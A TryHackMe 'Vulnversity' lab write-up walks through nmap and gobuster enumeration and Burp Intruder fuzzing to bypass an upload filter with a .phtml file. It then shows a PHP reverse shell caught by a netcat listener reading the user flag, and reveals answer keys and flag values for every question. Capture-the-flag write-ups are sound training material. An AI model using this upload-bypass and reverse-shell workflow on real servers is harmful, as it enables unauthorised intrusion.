---
title: TryHackMe - Vulnversity
author: 
categories: [TryHackMe]
tags: []
media_subpath: /assets/images/tryhackme/vulnversity/
image:
  path: room_pic.png
---


## Overview

![room](room.png)

| Name            | [Vulnversity](https://tryhackme.com/room/vulnversity)                                 |
| ------------    | ------------------------------------------------------------------------------------- |
| Difficulty:     | Easy                                                                                  |
| Tools:          | Nmap, Gobuster, Burpsuite, netcat                                                     |
| Topics:         | Network Enumeration, Web Enumeration, SUID/GUID


## Task 2: Reconnaissance using Nmap

Start with `nmap` scan to get an overview of the target using the `-sV` flag

> -sV: Attempts to determine the version of the services running
{: .prompt-info }

```bash
$ nmap -sV 10.10.36.68
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for ip-10-10-36-68.eu-west-1.compute.internal (10.10.36.68)
Host is up (0.0049s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:63:12:1B:49:CD (Unknown)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.67 seconds                                                      
```

We can see ports `21, 22, 139, 445, 3128 and 3333` are open and likely running `Ubuntu` OS

Web servers usually run on port `80` but here, the Apache web server is running on port `3333`. Might be interesting for further investigation

> **Scan the box, how many ports are open?**
  ><details><summary>Click for answer</summary>6</details>

> **What version of the squid proxy is running on the machine?**
  ><details><summary>Click for answer</summary>3.5.12</details>

> **How many ports will nmap scan if the flag -p-400 was used?**
  ><details><summary>Click for answer</summary>400</details>

> **What is the most likely operating system this machine is running?**
  ><details><summary>Click for answer</summary>Ubuntu</details>

> **What port is the web server running on?**
  ><details><summary>Click for answer</summary>3333</details>

> **What is the flag for enabling verbose mode using Nmap?**
  ><details><summary>Click for answer</summary>-v</details>


## Task 3: Locating directories using Gobuster

Seeing the presence of a web server, we'll enumerate the directories using `Gobuster` by providing a wordlist

> On Kali Linux, wordlists are located in `/usr/share/wordlists`
{: .prompt-tip }

```bash
$ gobuster dir -u http://10.10.36.68:3333 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.36.68:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 318] [--> http://10.10.36.68:3333/images/]
/css                  (Status: 301) [Size: 315] [--> http://10.10.36.68:3333/css/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.36.68:3333/js/]
/internal             (Status: 301) [Size: 320] [--> http://10.10.36.68:3333/internal/]
Progress: 141063 / 141709 (99.54%)===============================================================
Finished
===============================================================
```

In a browser, explore the URL and the directories found with Gobuster. Navigating to `http://10.10.36.68:3333/internal`, we find an upload form, giving an opportunity to upload a malicious payload

> **What is the directory that has an upload form page?**
  ><details><summary>Click for answer</summary>/internal/</details>


## Task 4: Compromise the Webserver using Burpsuite

Try uploading a `.txt` or `.php` file and it returns a `Extension not allowed` message so the form only accepts certain file extensions 

![Extension not allowed](ext_not_allowed.png)

> **What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.**
  >*<details><summary>Click for answer</summary>.php</details>*

Using `Burpsuite`, we will utilize the `Proxy` and `Intruder` tools to fuzz the upload form to see which extensions it will accept and craft our payload depending on that

1. In the `Proxy` tab, open Burp's browser and turn Intercept on
2. Navigate to `<IP address>/internal` page and upload a file
3. In Burp, you'll see the request being intercepted. Click Action and send it to `Intruder`
4. In the `Intruder` tab, select `Sniper` as the attack type, highlight the `.extension` of your file and add a payload marker §. This is the variable that will be changed in each upload attempt, trying each entry in the `phpext.txt` file
5. In the `Payloads` tab, load `phpext.txt` in the Payload Options section
6. Click Start Attack

> Press `Clear §` to clear existing payload markers before you add your own
{: .prompt-tip }
> Uncheck the URL Encoding option at the bottom or the uploads will encode `.` as `%2e` and all fuzzing attempts will be unsuccessful
{: .prompt-warning }

![Intruder Setup](intruder_setup.png)

![Payload](payload.png)

View the results and check the responses for each file extension. Only `.phtml` has a different file length and a `Success` response. This is the extension we will use for our payload

![Intruder](intruder_success.png)

> **What extension is allowed after running the above exercise?**
  ><details><summary>Click for answer</summary>.phtml</details>

### Getting a Reverse Shell

We will attempt to upload a reverse shell that executes on the target and calls back to us to make a connection

In the reverse shell php file, edit the `$ip` variable and rename the file with a `.phtml` extension

```bash
$ mv php-reverse-shell.php php-reverse-shell.phtml
```

![IP](ip.png)

Start a `netcat` listener to listen for any incoming connections. After uploading and executing the reverse shell, we should see an established connection and a bash prompt where we can enter commands to get the flag

```bash
# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.223.107] from (UNKNOWN) [10.10.36.68] 42146
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 19:48:00 up  3:15,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls /home
bill
$ cat /home/bill/user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

> **What is the name of the user who manages the webserver?**
  ><details><summary>Click for answer</summary>Bill</details>

> **What is the user flag?**<br>
  ><details><summary>Click for answer</summary>8bd7992fbe8a6ad22a63361004cfcedb</details>

## Task 5: Privilege Escalation



> **On the system, search for all SUID files. Which file stands out?**<br>
  ><details><summary>Click for answer</summary>/bin/systemctl</details>


> **What is the root flag value?**<br>
  ><details><summary>Click for answer</summary>a58ff8579f0a9270368d33a9966c7fd5</details>

